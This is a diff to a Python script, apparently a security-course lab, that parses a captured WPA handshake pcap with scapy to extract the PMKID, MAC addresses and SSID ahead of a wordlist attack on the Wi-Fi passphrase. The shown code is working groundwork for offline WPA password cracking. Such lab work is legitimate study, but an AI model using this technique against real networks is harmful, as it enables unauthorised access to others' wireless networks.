@@ -2,7 +2,7 @@ import hashlib
 import hmac
 from binascii import a2b_hex
 from itertools import islice
-
+from scapy.contrib.wpa_eapol import WPA_key
 from pbkdf2 import *
 
 from scapy.all import *
@@ -11,19 +11,29 @@ if __name__ == '__main__':
     wpa = rdpcap("PMKID_handshake.pcap")
     A = "Pairwise key expansion"
     f = open("wordlist")
-    ssid = wpa[144].info.decode("utf-8")
-    pmkid = raw(wpa[145])[0xc1:0xd1]
-    APmac = a2b_hex(wpa[145].addr2.replace(":", ""))
-    Clientmac = a2b_hex(wpa[145].addr1.replace(":", ""))
-    md5 = raw(wpa[145])[0x5e]
-    '''
-    ANonce = wpa[5].getlayer(WPA_key).nonce
-    SNonce = raw(wpa[6])[65:-72]
-    data = raw(wpa[8])[0x30:0x81] + b"\x00" * 16 + raw(wpa[8])[0x91:0x93]
-    md5 = raw(wpa[8])[0x36]
-    '''
+    ssid = ""
+    APmac=""
+    Clientmac =""
+    md5 =""
+    pmkid=""
+    # beacon
+    # key_info &3 pour sha1
+
+    for trame in wpa:
+        if trame.subtype == 8 and trame.type ==2 and trame.len ==54 and trame.FCfield=="from-DS":
+            APmac = a2b_hex(trame.addr2.replace(":", ""))
+            Clientmac = a2b_hex(trame.addr1.replace(":", ""))
+            pmkid = trame.wpa_key[6:]
+            md5 =  trame.key_info & 0x3
+            break
+    for trame in wpa:
+        if trame.subtype == 8 and trame.type == 0:
+            if a2b_hex(trame.addr2.replace(":", ""))==APmac:
+                ssid = trame.info.decode("utf-8")
+                break
 
     ssid = str.encode(ssid)
+    print(ssid,APmac,Clientmac)
     for line in f:
         line = line.replace("\r", "")
         line = line.replace("\n", "")
